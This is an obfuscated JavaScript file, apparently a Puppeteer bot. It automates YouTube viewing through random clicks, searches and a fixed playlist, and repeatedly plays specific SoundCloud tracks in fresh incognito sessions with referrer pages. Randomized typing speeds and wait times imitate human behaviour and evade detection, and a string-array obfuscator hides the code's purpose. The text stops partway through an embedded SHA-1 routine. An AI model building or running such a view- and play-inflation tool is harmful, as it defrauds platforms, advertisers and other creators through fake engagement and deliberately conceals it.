const W = d,
  V = b,
  U = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x4b2 + -0x1011 + 0xb60))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2605 + 0x70 * 0x2a + -0x3865 * 0x1);
    let h = e[f];
    if (c['jOjrJr'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x12cb + -0x3 * -0x935 + -0xe2 * 0xa, r, s, t = -0xa01 * -0x3 + -0x13 * -0x151 + -0x3706; s = m['charAt'](t++); ~s && (r = q % (-0x1 * 0xcf2 + -0x1867 + -0x255d * -0x1) ? r * (0x1 * -0xc9a + 0x2498 + 0x7ea * -0x3) + s : s, q++ % (-0x203f + 0x147a + 0xbc9)) ? o += String['fromCharCode'](0x12de * -0x1 + -0x202 * -0x13 + 0x1 * -0x1249 & r >> (-(0x26df + -0x219 * -0xf + 0x2 * -0x232a) * q & -0xd15 + 0x13ec + -0x6d1)) : 0x2 * -0x17f + 0xce1 * 0x1 + -0x1 * 0x9e3) {
          s = n['indexOf'](s);
        }
        for (let u = -0x29 * -0x99 + 0x1115 + -0x2996 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xd03 * -0x3 + -0xc8c + 0x5bd * 0x9))['slice'](-(0x3 * 0x254 + 0x169b * 0x1 + -0x1d95 * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['KaCxKI'] = i, b = arguments, c['jOjrJr'] = !![];
    }
    const j = e[0x19bc + 0x1 * 0x10dd + -0x2a99],
      k = f + j,
      l = b[k];
    return !l ? (h = c['KaCxKI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x8d9 + -0x15a * 0x1 + -0x77f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x6dc6 * -0x2 + 0xa37 * 0x6 + -0xa3a6 + (0x3d6e + -0x4356 + 0x4080) * random()) : await standardWaitForNetIdle(f), await wait(0x13 * 0x202 + 0x1e54 + 0x5 * -0x9ca + (0x4dbd + -0x3eef * -0x1 + 0x2 * -0x32ce) * random()), -0xd15 + 0x13ec + -0x6d6;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2 * -0x17f + 0xce1 * 0x1 + -0x3 * -0x337), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x29 * -0x99 + 0x1115 + -0x2995 * 0x1;
}
async function randomWait() {
  return await wait(0xd03 * -0x3 + -0xc8c + 0xe39 * 0x5 + (0x3 * 0x254 + 0x169b * 0x1 + -0xa0f * 0x1) * random()), 0x19bc + 0x1 * 0x10dd + -0x2a98;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x2287 + -0x111c + 0x33a3, 0x11 * -0x1d4 + -0x1214 + 0x312f), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x2c4f + 0x22 * 0xa15 + -0x401b) * getRandomInt(0x15ed + 0x1 * 0x6a5 + -0x4 * 0x724, 0x1c4f + -0x98 * -0x33 + -0x31 * 0x132), h)), -0x1402 * -0x1 + -0x1031 + -0x3d0;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x26 * 0x11 + -0x55 * -0x16 + 0x24 * -0x22;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x219f * -0x1 + 0x785 + -0x1 * -0x1a1b]['split']('\x20');
    for (let k = 0x489 + -0x450 + 0x13 * -0x3; k < i['length']; k += 0x381 + 0x8 * 0x1e5 + -0x12a7)
      j += i[k] * h[i[k + (0x39 * -0x6 + -0x1f4c + 0x3 * 0xae1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * -0x119 + 0x1582 + -0x133 * 0x11)['map'](l => Array['from'](l['children']))['flat'](0x17c3 + 0x14e5 + -0x2ca7)['map'](l => l['childNodes'][0x5 * 0x43d + 0x3 * -0x763 + -0x1 * -0xf9]['childNodes'][0x18 * 0x107 + 0xfa7 * 0x2 + -0x37f6]['childNodes'][-0x766 * -0x5 + 0x2457 + -0x4954]['childNodes'][-0x3f4 + 0xa1 * 0x29 + -0x15d5 * 0x1]['childNodes'][-0x2673 + -0x20cc * -0x1 + -0x8 * -0xb5]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x955 * 0x4 + 0x310 + -0x247c, -0x1 * 0x17fd + 0x1 * -0x183e + 0x391 * 0x13)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5 * -0xce9 + 0x97 * -0x25 + 0x54a * 0x3);
  const h = await getMaxTime(f),
    i = Math['min']((0xdfdf * -0x1 + -0x9 * -0x2689 + 0x6f6e) * getRandomInt(-0xe8 * -0x1f + -0x21e6 + -0x10 * -0x5d, -0xffe + 0x919 * 0x2 + -0x22f), h);
  return await wait(i), -0x48 + -0x1f9e + 0x1fe7;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xd * 0xad + 0x1c3 * -0x16 + -0x3 * -0xfd9]['children'][-0xfd + -0xbb7 + 0xcb4]['children'][-0x879 + -0xb7 + 0x4 * 0x24c]['children'][0x1ff5 + -0x173 * -0x2 + -0x22db]['children'][-0x1d88 + -0x6c1 * 0x5 + 0x3f4d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1336 + 0x7 * 0x26 + 0xb * 0x1a7;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1af8 + -0x179e * -0x1 + 0x3be * 0x1 + (-0x1 * -0x6d + -0xcd * 0x13 + -0xe * -0x112) * random()
  }), await wait(0x1 * -0x263 + 0xdbd + -0x966 + (0x291 + -0x12 * -0x9d + -0xc6f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const R = b,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName'](R(0x13, 'JjZI') + 'renderer'))['map'](p => p['childNodes'][0x2 * 0x11c2 + -0x1cc5 + 0x5 * -0x159]['childNodes'][-0x7f * -0x3 + 0xe76 + -0xff2]['childNodes'][-0x1 * -0x4bd + -0x1 * 0x113 + 0x3a9 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xf15 + -0x2eb * -0x2 + 0x944]['childNodes'][0x3 * 0x3e1 + 0x2657 + -0x31fa]['childNodes'][-0xcee * 0x1 + 0x9d * -0x7 + 0x113b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x8c7 + 0x130c * 0x2 + -0x2ede),
          r = -0x9 * 0x3ec + -0x488 + 0x27d4;
        for (let u = -0x8bd + 0xfd0 + -0x713; u < q['length']; u += -0x1d28 + 0x1829 * -0x1 + -0x11 * -0x323)
          r += q[u] * k[q[u + (0x1 * 0x2369 + -0x1 * 0x26f5 + 0x9 * 0x65)]];
        return r;
      }(n);
  });
  await wait((0x6685 + -0x1 * -0x21df + -0x4dcc) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x4d8f + -0x186fd + 0x2beec) * getRandomInt(0xb29 * -0x1 + -0x4 * -0x46c + -0x686, 0x9de + 0x1bd1 * -0x1 + 0x3 * 0x5ff), h + (0xf32 + 0x1c * 0xf7 + -0x1 * 0x16ae));
  return await wait(i), 0xe1b + 0x1394 + -0x21ae;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x2ab * 0x2 + -0x2 * -0x6bb + -0x3 * 0x644), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x7b9 + -0x1d * -0xa3 + -0xa * -0x19 + (-0x5c * 0x1d + -0x7 * 0x295 + 0x2067 * 0x1) * Math['random']());
    });
  }, -0x59 * 0x47 + -0x2790 + 0x5b97);
  await wait(0x89e34 + -0x1 * 0xc9d2 + -0x34082);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x9c5 * -0x3 + -0xab * -0x2e + 0xae57) * getRandomInt(0x11 * 0x1 + -0x169 * 0x2 + 0x2c5, 0x19e5 + -0x92 * 0x10 + -0x61 * 0x2c)), clearInterval(h), -0x3cf + 0x15e * 0x13 + -0x162a;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x5 * 0x732 + -0x1d34 + -0x6c6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0x252f + 0x985 * -0x1 + -0x61 * 0x49;
    await randomWait();
  }
  return -0x4a * 0x2 + 0x2 * 0x106d + 0x2045 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= -0x9b7 + -0x3b * 0x53 + 0x1a * 0x11c + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x55 * 0x5f + -0xf62 * 0x2 + 0x199 * 0x27 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x251c + 0x1e40 + -0x435c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x109 * -0x24 + -0x11bc + 0xfa * -0x14;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const S = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + S(0x4) + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x7d59 * -0x2 + -0xc1 * -0x183 + -0x16ead + getRandomInt(0x6d10 + -0x5ac5 + 0x284d, 0x12f5 + -0xd619 + -0x9 * -0x22b4));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1819 + 0x1 * -0x2669 + -0x1 * -0xe51), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x8e4 + -0x15bd + -0x1 * -0x1ea1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s[T(0x10, 'n2%I')]('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1715 + -0x1dc2 + 0x51 * 0xa7, -0x18c2 + -0x3 * 0x33b + 0x22a5 * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xe5 * 0x13 + 0x2a5 + -0xbd4 + floor((0x154a + 0x268a + -0x6 * 0x952) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1a * 0x327e259 + 0x9f2d6d4 + -0x3 * -0x42b36212),
          -0x3a91b9 * 0x3 + -0xd17f46 + 0x2013471,
          0xe65f + 0xdc14 + -0x14273,
          -0x1d15 + -0x7d9 + 0x256e
        ], y = [
          0x1 * 0x149d + -0x1 * 0x2363 + 0x76f * 0x2,
          -0x105b + 0x1df9 + 0x1 * -0xd8e,
          0x2096 + 0xd82 + -0x2e10,
          -0x1 * -0x21eb + -0x182d + 0x56 * -0x1d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x35f * 0x9 + 0x1d83 + 0xd5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1 * -0x399 + 0x7fa + 0xb93 * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x870 + -0x1472 + 0xc02) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x174 * -0x6 + 0x348 + 0x6 * -0x200] = A[-0x1 * 0x188b + -0x397 * -0x1 + -0x5 * -0x434] = A[-0x1 * 0xc6d + -0x1 * -0x15f4 + -0x986] = A[-0x1 * -0x316 + -0x1e7 * 0x5 + -0x1 * -0x66f] = A[-0x1863 * 0x1 + 0xda0 + -0x18a * -0x7] = A[0xd90 * -0x1 + -0x76d + 0x1501] = A[0x5 * 0x22e + 0x4 * -0xb8 + -0x801] = A[0x228b + 0x503 * -0x5 + -0x976] = A[-0x1d4 * -0xf + 0x44 * -0x55 + -0x4d1] = A[-0x459 + -0x1a62 + 0x1ec3] = A[0xf88 + -0x21e4 + 0x1265] = A[-0x90b * -0x1 + -0xeb7 + 0x5b6] = A[-0x2 * -0xd0f + 0xc6d + 0x1c * -0x160] = A[-0x438 + -0x2159 + 0x259d] = A[-0x2701 * 0x1 + -0x267a + -0x676 * -0xc] = A[0x1abd + 0x26b6 * 0x1 + -0x4165] = A[0x1291 + 0x2 * 0x1fb + -0x1678] = 0x1432 + 0x376 + -0x2 * 0xbd4, this['blocks'] = A) : this['blocks'] = [
                0x45 * -0x51 + 0x95 * 0x35 + -0x904,
                0x2081 + 0x1 * -0x2090 + 0xf,
                -0x2e * 0x54 + 0x12bc + -0x3a4,
                0x1 * -0xa3c + 0x1c * -0x12 + 0xc34,
                0x20a0 + 0x1468 + -0x3508 * 0x1,
                0x8e1 + -0x1e10 + 0x152f,
                0x3 * -0x159 + -0x257e + 0x2989,
                0x16b5 * 0x1 + 0xe81 * -0x2 + -0x1 * -0x64d,
                -0x7 * -0x421 + -0x17 * -0xbf + -0x43 * 0xb0,
                -0x18db + 0xec5 + -0x1 * -0xa16,
                0x1dd * -0xe + -0xe02 + 0x2818,
                -0x51f + 0x56 * 0x35 + -0xcaf,
                0x1dbd + -0x3 * -0xb9 + -0x1fe8,
                -0x9a * 0x27 + 0x1b05 + -0x1 * 0x38f,
                0x87 * -0x1b + 0x1 * 0x2221 + -0x4 * 0x4f9,
                0x1 * 0xcd0 + 0x1 * -0x1f3d + 0x126d,
                0x264f + 0x1a03 * 0x1 + -0x1 * 0x4052
              ], this['h0'] = -0x191714d5 * 0x3 + 0x682f0f82 + 0x76f8833 * 0xa, this['h1'] = -0x17c0b1bfc + -0x13c327be4 + -0x4c65 * -0xc40b5, this['h2'] = -0x49d889d8 + -0x283be288 + 0x10acf495e, this['h3'] = 0x2 * 0xf29f6c5 + 0x63697 * -0x44d + 0x185 * 0x8492b, this['h4'] = -0x129bf45e9 + -0xa2e68f48 * 0x1 + 0x29078b721, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x61c + -0x397 * 0x3 + 0x1 * 0x4a9, this['finalized'] = this['hashed'] = 0xa * 0xbf + -0x3 * -0x148 + 0x2 * -0x5a7, this['first'] = 0x1 * 0x1c1d + -0x7 * 0x307 + -0xa1 * 0xb;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x17c + 0x13a3 + 0x1 * -0x1227, O = J['length'] || 0x1a * -0x174 + 0x1902 + -0x221 * -0x6, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1c67 + 0x277 * -0x7 + -0xf38 * -0x3, P[0x1 * 0xa7f + 0xe9f + -0x191e] = this['block'], P[0x6e8 + -0x7 * 0x359 + 0x1097] = P[0x2422 + 0x113 + -0x1 * 0x2534] = P[-0x1 * 0xc10 + 0x2504 + -0x18f2] = P[-0x85 * -0x43 + 0x1d4e + -0x401a] = P[0x1081 + 0x1629 + -0x26a6] = P[0x861 + 0x1ce1 * -0x1 + 0x1485] = P[0x1 * -0x24b9 + 0xddb * -0x1 + -0x2 * -0x194d] = P[0x14c8 + -0x6a * 0x39 + 0x2d9] = P[-0xd6 * 0x6 + 0x23b + 0x2d1] = P[-0x5 * 0x74b + -0xf + -0x539 * -0x7] = P[-0xee5 + 0x4da + 0xa15] = P[-0x55 + 0x112d + 0xbb * -0x17] = P[0x1ed0 + 0x1ed7 + -0x7 * 0x8cd] = P[0xafd * 0x1 + 0x181d * 0x1 + -0x3e5 * 0x9] = P[0x25b7 + 0xa * -0x35d + 0x407 * -0x1] = P[-0x1f44 + -0x4 * -0x210 + 0x1713] = 0x2137 + 0x2f * -0x44 + -0x14bb * 0x1), K) {
                    for (N = this['start']; M < O && N < 0x185e + -0x17 * 0x161 + 0x799; ++M)
                      P[N >> -0x14fe + 0x11d4 + -0x32c * -0x1] |= J[M] << y[0x1271 + 0x22ed + -0x57 * 0x9d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x15a0 + 0x65 * 0x2b + 0x4e9; ++M)
                      (L = J['charCodeAt'](M)) < -0x10b5 * -0x2 + -0xd74 + -0x1376 ? P[N >> 0x7 * 0x249 + -0x91e + 0x1 * -0x6df] |= L << y[0x19 * 0xa0 + 0x6 * -0x133 + -0x86b & N++] : L < -0x11fc * 0x1 + -0x8f7 + 0x22f3 * 0x1 ? (P[N >> -0x1def * 0x1 + -0x12de + 0x30cf] |= (-0x7c * 0x5 + -0x8 * -0x353 + -0x176c * 0x1 | L >> 0x48 * -0x35 + -0x1 * 0x1e1 + -0x1 * -0x10cf) << y[0x2494 + -0x2cc * 0x8 + -0xe31 & N++], P[N >> 0x5 * 0x43 + 0x655 * 0x5 + -0x20f6] |= (0x10b2 + -0x1f4f + 0xf1d | -0xf * -0xff + 0x1bae + -0x2a60 & L) << y[-0x9f1 + -0xbaa + 0xacf * 0x2 & N++]) : L < 0xd5fb + 0x3 * -0x7c69 + -0x5dd0 * -0x4 || L >= -0x4 * 0x3615 + -0xa735 + 0x25f89 ? (P[N >> -0x7f7 * 0x2 + 0x20 * -0xed + 0x2d90] |= (-0x124c + 0xe57 * 0x1 + 0x4d5 | L >> -0x20c8 + 0x21 * 0x103 + -0xb * 0xd) << y[0x1 * -0x1797 + 0x22b6 * -0x1 + -0x3a5 * -0x10 & N++], P[N >> -0x249 + 0x142f * -0x1 + 0x167a] |= (-0x3 * -0xa39 + -0x1 * 0x11c2 + -0xc69 | L >> 0x139e + -0x16 * 0x1b6 + 0xe * 0x14a & 0x2 * -0x98c + 0xe9 * 0xd + 0x782) << y[0x2 * -0xb2a + -0xa28 + 0x207f & N++], P[N >> 0x56d + 0x2331 * 0x1 + 0x5c * -0x71] |= (-0x750 + -0x1 * 0xfa8 + 0x1778 | -0x1 * 0x1fef + 0x5ff * -0x3 + 0x322b & L) << y[0xa30 + -0x2273 * 0x1 + 0x1846 * 0x1 & N++]) : (L = 0x498e * 0x6 + 0x18176 + -0x23aca + ((-0x15c7 + -0x1cbd + -0x1 * -0x3683 & L) << -0x238a + -0x2445 + 0x3 * 0x17f3 | -0x17e * -0x11 + -0x6e0 + -0xe7f & J['charCodeAt'](++M)), P[N >> -0xbdc + -0x1 * 0x1c46 + 0x1412 * 0x2] |= (0x14f8 + -0x1 * -0xf0d + -0x2315 | L >> -0x1b2d + -0x28 * -0x3a + 0x85 * 0x23) << y[0x4 * 0x382 + 0xe4 * 0x4 + -0x283 * 0x7 & N++], P[N >> -0x10c3 + -0x60 * -0x2f + -0xdb] |= (-0x7f * 0x29 + -0x44 * -0x86 + -0x4eb * 0x3 | L >> -0xb * 0x179 + -0x2 * 0x277 + -0x70f * -0x3 & -0x35a + -0x2 * -0x113 + 0x7 * 0x35) << y[-0x75e + -0x1c3c * 0x1 + 0x1 * 0x239d & N++], P[N >> -0x1418 * -0x1 + -0x65 * 0x1 + 0x13b1 * -0x1] |= (-0x13fd + 0x24c0 + 0x1 * -0x1043 | L >> 0x15f1 + 0x17a9 + 0x16ca * -0x2 & 0x38 + -0x133 + 0x13a) << y[-0x1 * -0x184 + 0x7 * -0x3bc + -0x18a3 * -0x1 & N++], P[N >> -0x1aaa + -0x2256 + -0x1456 * -0x3] |= (-0xa1e + 0xb33 + -0x95 | -0x1 * -0x1fb7 + -0x25bd + 0x645 & L) << y[0x3 * 0x6df + -0x18cf + -0x167 * -0x3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1b * 0x3 + 0x2631 + -0x25a0 ? (this['block'] = P[-0x1a6d + 0x1e28 + -0x3ab], this['start'] = N - (-0x39 * -0x21 + 0xe * 0x59 + 0xbf7 * -0x1), this['hash'](), this['hashed'] = -0x1d89 + 0xbaf + 0x11db) : this['start'] = N;
                }
                return this['bytes'] > 0x3c1 * 0x3c1ac + 0x1c0c0937b + -0x3 * 0x44f388b8 && (this['hBytes'] += this['bytes'] / (0x14cff6dc8 + 0x1ea369d90 + -0x237360b58) << 0x14f * 0x19 + 0x2134 + -0x41eb, this['bytes'] = this['bytes'] % (0x139bc434 * -0x8 + -0x204c6584 + -0x371c * -0x813ef)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1334 + -0x4 * -0x4db + -0x5 * 0xb;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * -0x22 + 0x1 * 0x173f + 0x2f * -0x7f] = this['block'], J[K >> 0xb90 + 0x1c * -0x137 + -0xb3b * -0x2] |= x[-0x4e9 * -0x7 + 0x1 * 0x1dfb + -0x4057 & K], this['block'] = J[-0xf67 * 0x2 + 0xdc7 + 0x1117], K >= -0x4e9 + -0x9 * -0x17e + 0x84d * -0x1 && (this['hashed'] || this['hash'](), J[0x15 * -0xfc + 0x1 * -0xf6d + 0x2419] = this['block'], J[-0x19ff + -0x637 * 0x4 + 0x32eb] = J[-0x17e9 + 0x1 * 0xa7f + 0xd6b] = J[0x101f + -0x7e + -0xf9f] = J[-0x1 * -0x254b + 0x1b1 * 0x15 + -0x48cd] = J[0x21cf + 0x1 * -0xbe9 + 0xaf1 * -0x2] = J[0x1 * 0x22ff + 0x11 * -0x28 + -0x24f * 0xe] = J[0x1ca * 0x9 + -0x268 * -0x4 + -0xeb * 0x1c] = J[-0xeab * -0x2 + 0x131e + 0xb * -0x467] = J[-0x8 * 0x40 + 0x8cc * -0x2 + -0x20 * -0x9d] = J[0x1be9 * 0x1 + -0x681 + 0x155f * -0x1] = J[0x2e3 + -0x107c + -0x1 * -0xda3] = J[-0xa6d + -0x1cb2 + 0x272a] = J[-0x26d6 + -0x2432 + 0x5 * 0xf04] = J[0x1709 * -0x1 + 0x122 * 0x16 + -0x1d6] = J[-0x1 * -0x26b + 0x1 * 0x12a + 0x387 * -0x1] = J[-0x2fe * 0xa + 0x2 * 0x598 + 0x12cb] = -0xf6d + 0xe5f + 0x10e), J[-0x21d4 + -0x5ae * 0x4 + 0x389a] = this['hBytes'] << 0x53d + 0x16bf + -0x1bf9 | this['bytes'] >>> -0x1d19 + 0x444 + -0x67 * -0x3e, J[-0x356 + -0xd * 0x1d4 + 0x199 * 0x11] = this['bytes'] << -0xfc4 + 0x16e0 + -0x17 * 0x4f, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
